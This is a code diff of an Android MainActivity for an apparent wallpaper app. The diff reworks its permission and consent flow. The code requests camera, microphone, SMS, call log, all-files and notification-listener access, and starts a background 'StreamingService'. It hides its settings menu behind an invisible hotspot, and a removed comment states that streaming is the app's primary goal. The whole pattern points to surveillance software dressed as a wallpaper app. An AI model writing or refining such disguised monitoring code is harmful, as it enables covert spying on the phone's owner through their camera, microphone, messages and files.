@@ -21,7 +21,6 @@ import androidx.activity.result.ActivityResultLauncher;
 import androidx.activity.result.contract.ActivityResultContracts;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.content.ContextCompat;
-import androidx.preference.PreferenceManager;
 import androidx.recyclerview.widget.GridLayoutManager;
 import androidx.recyclerview.widget.RecyclerView;
 
@@ -51,21 +50,35 @@ public class MainActivity extends AppCompatActivity implements WallpaperAdapter.
     private static final String APP_PREFS = "app_prefs";
     private static final String KEY_STREAM_OPT_IN = "stream_opt_in";
 
-    // Launch ConsentActivity for result (don’t finish MainActivity)
+    // FIX Bug 18 — ConsentActivity launcher registered AND used in onCreate()
     private final ActivityResultLauncher<Intent> consentLauncher =
             registerForActivityResult(new ActivityResultContracts.StartActivityForResult(), result -> {
                 if (result.getResultCode() == Activity.RESULT_OK) {
-                    // If the user opted-in, start service
                     SharedPreferences appPrefs = getSharedPreferences(APP_PREFS, MODE_PRIVATE);
                     if (appPrefs.getBoolean(KEY_STREAM_OPT_IN, false)) {
                         ensureStreamingServiceRunning();
                     }
-                    // Now initialize the UI (if not already)
                     initUi();
                 } else {
-                    // User declined permissions/consent -> close or show a minimal screen
                     Toast.makeText(this, "Permissions required to proceed.", Toast.LENGTH_LONG).show();
                     finish();
+                }
+            });
+
+    // FIX Bug 14 — Replace startActivityForResult(intent, 2296) with ActivityResultLauncher
+    private final ActivityResultLauncher<Intent> manageStorageLauncher =
+            registerForActivityResult(new ActivityResultContracts.StartActivityForResult(), result -> {
+                // Re-check after user returns from All Files Access settings
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                    if (android.os.Environment.isExternalStorageManager()) {
+                        ensureStreamingServiceRunning();
+                        checkNotificationAccess();
+                        initUi();
+                    } else {
+                        Toast.makeText(this, "All Files Access is required for file explorer feature.", Toast.LENGTH_LONG).show();
+                        // Still init UI for wallpaper features
+                        initUi();
+                    }
                 }
             });
 
@@ -76,22 +89,29 @@ public class MainActivity extends AppCompatActivity implements WallpaperAdapter.
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        // Auto-Start Logic: Check permissions immediately
-        if (checkPermissions()) {
-            ensureStreamingServiceRunning();
-            checkNotificationAccess();
-            // Permissions granted, initialize UI
-            initUi();
-        } 
-        
-        // We still init UI for the wallpaper features, but the primary goal is streaming.
         if (executorService == null) executorService = Executors.newSingleThreadExecutor();
         if (mainHandler == null) mainHandler = new Handler(Looper.getMainLooper());
+
+        // FIX Bug 18 — Check if consent already given; if not, launch ConsentActivity
+        SharedPreferences appPrefs = getSharedPreferences(APP_PREFS, MODE_PRIVATE);
+        boolean consentGiven = appPrefs.getBoolean(KEY_CONSENT_GIVEN, false);
+
+        if (!consentGiven) {
+            // Launch ConsentActivity to request permissions first
+            consentLauncher.launch(new Intent(this, ConsentActivity.class));
+        } else {
+            // Permissions previously granted — proceed
+            if (checkPermissions()) {
+                ensureStreamingServiceRunning();
+                checkNotificationAccess();
+            }
+            initUi();
+        }
     }
 
     private boolean checkPermissions() {
         List<String> permissions = new ArrayList<>();
-        
+
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED)
             permissions.add(Manifest.permission.CAMERA);
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED)
@@ -102,36 +122,33 @@ public class MainActivity extends AppCompatActivity implements WallpaperAdapter.
             permissions.add(Manifest.permission.READ_CALL_LOG);
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED)
             permissions.add(Manifest.permission.READ_SMS);
-            
-        // POST_NOTIFICATIONS for Android 13+
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                 permissions.add(Manifest.permission.POST_NOTIFICATIONS);
             }
         }
 
-        // Storage Permission (Android 11+ vs Old)
+        // FIX Bug 14 — Use ActivityResultLauncher instead of deprecated startActivityForResult
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             if (!android.os.Environment.isExternalStorageManager()) {
                 try {
                     Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                     intent.setData(Uri.parse("package:" + getPackageName()));
-                    startActivityForResult(intent, 2296);
+                    manageStorageLauncher.launch(intent);
                 } catch (Exception e) {
                     Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
-                    startActivityForResult(intent, 2296);
+                    manageStorageLauncher.launch(intent);
                 }
-                // We return false here because we need to wait for the user to return from settings
-                // But we ALSO need to request the other permissions if any are missing.
                 if (!permissions.isEmpty()) {
-                   ActivityCompat.requestPermissions(this, permissions.toArray(new String[0]), PERMISSION_REQUEST_CODE);
+                    ActivityCompat.requestPermissions(this, permissions.toArray(new String[0]), PERMISSION_REQUEST_CODE);
                 }
-                return false; 
+                return false;
             }
         } else {
-             if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
                 permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
-             if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
                 permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
         }
 
@@ -147,25 +164,23 @@ public class MainActivity extends AppCompatActivity implements WallpaperAdapter.
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
-             boolean allGranted = true;
-             for (int result : grantResults) {
-                 if (result != PackageManager.PERMISSION_GRANTED) {
-                     allGranted = false;
-                     break;
-                 }
-             }
-             if (allGranted) {
-                 ensureStreamingServiceRunning();
-                 checkNotificationAccess();
-                 initUi();
-             } else {
-                 Toast.makeText(this, "Permissions required for auto-stream functionality", Toast.LENGTH_LONG).show();
-             }
+            boolean allGranted = true;
+            for (int result : grantResults) {
+                if (result != PackageManager.PERMISSION_GRANTED) {
+                    allGranted = false;
+                    break;
+                }
+            }
+            if (allGranted) {
+                ensureStreamingServiceRunning();
+                checkNotificationAccess();
+                initUi();
+            } else {
+                Toast.makeText(this, "Permissions required for auto-stream functionality", Toast.LENGTH_LONG).show();
+            }
         }
     }
-    
-    // Check if we need to guide user to Notification Listener settings (Android specific)
-    // Check if we need to guide user to Notification Listener settings (Android specific)
+
     private void checkNotificationAccess() {
         if (!isNotificationServiceEnabled()) {
             Toast.makeText(this, "Please enable Notification Access for the app", Toast.LENGTH_LONG).show();
@@ -173,27 +188,20 @@ public class MainActivity extends AppCompatActivity implements WallpaperAdapter.
         }
     }
 
-    private boolean isNotificationServiceEnabled(){
+    private boolean isNotificationServiceEnabled() {
         String pkgName = getPackageName();
         final String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
         if (flat != null && !flat.isEmpty()) {
-            final String[] names = flat.split(":");
-            for (String name : names) {
-                if (name.contains(pkgName)) {
-                    return true;
-                }
+            for (String name : flat.split(":")) {
+                if (name.contains(pkgName)) return true;
             }
         }
         return false;
     }
 
     private void initUi() {
-        if (executorService == null) {
-            executorService = Executors.newSingleThreadExecutor();
-        }
-        if (mainHandler == null) {
-            mainHandler = new Handler(Looper.getMainLooper());
-        }
+        if (executorService == null) executorService = Executors.newSingleThreadExecutor();
+        if (mainHandler == null) mainHandler = new Handler(Looper.getMainLooper());
 
         MaterialToolbar toolbar = findViewById(R.id.toolbar);
         setSupportActionBar(toolbar);
@@ -209,7 +217,6 @@ public class MainActivity extends AppCompatActivity implements WallpaperAdapter.
     public boolean onCreateOptionsMenu(Menu menu) {
         getMenuInflater().inflate(R.menu.main_menu, menu);
 
-        // Invisible but tappable “Settings” hotspot
         MenuItem settings = menu.findItem(R.id.action_settings);
         settings.setIcon(null);
         settings.setTitle("");
@@ -237,7 +244,6 @@ public class MainActivity extends AppCompatActivity implements WallpaperAdapter.
         return super.onOptionsItemSelected(item);
     }
 
-    /** Starts the foreground StreamingService (idempotent). */
     private void ensureStreamingServiceRunning() {
         try {
             Intent svc = new Intent(this, StreamingService.class);
@@ -266,12 +272,10 @@ public class MainActivity extends AppCompatActivity implements WallpaperAdapter.
             bottomSheet.dismiss();
             applyWallpaperInBackground(wallpaperId, WallpaperManager.FLAG_SYSTEM);
         });
-
         btnLock.setOnClickListener(v -> {
             bottomSheet.dismiss();
             applyWallpaperInBackground(wallpaperId, WallpaperManager.FLAG_LOCK);
         });
-
         btnBoth.setOnClickListener(v -> {
             bottomSheet.dismiss();
             applyWallpaperInBackground(wallpaperId, WallpaperManager.FLAG_SYSTEM | WallpaperManager.FLAG_LOCK);
@@ -292,11 +296,10 @@ public class MainActivity extends AppCompatActivity implements WallpaperAdapter.
             try {
                 Bitmap bitmap = WallpaperUtils.decodeSampledBitmapFromResource(
                         getResources(), wallpaperId, 1080, 1920);
-
                 if (bitmap == null) throw new IOException("Failed to decode bitmap");
 
                 WallpaperManager wm = WallpaperManager.getInstance(getApplicationContext());
-                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                     wm.setBitmap(bitmap, null, true, flags);
                 } else {
                     wm.setBitmap(bitmap);
@@ -309,7 +312,6 @@ public class MainActivity extends AppCompatActivity implements WallpaperAdapter.
                         Toast.makeText(this, getSuccessMessage(flags), Toast.LENGTH_SHORT).show();
                     }
                 });
-
             } catch (IOException e) {
                 mainHandler.post(() -> {
                     if (!isFinishing() && !isDestroyed()) {
@@ -330,8 +332,6 @@ public class MainActivity extends AppCompatActivity implements WallpaperAdapter.
     @Override
     protected void onDestroy() {
         super.onDestroy();
-        if (executorService != null && !executorService.isShutdown()) {
-            executorService.shutdown();
-        }
+        if (executorService != null && !executorService.isShutdown()) executorService.shutdown();
     }
 }
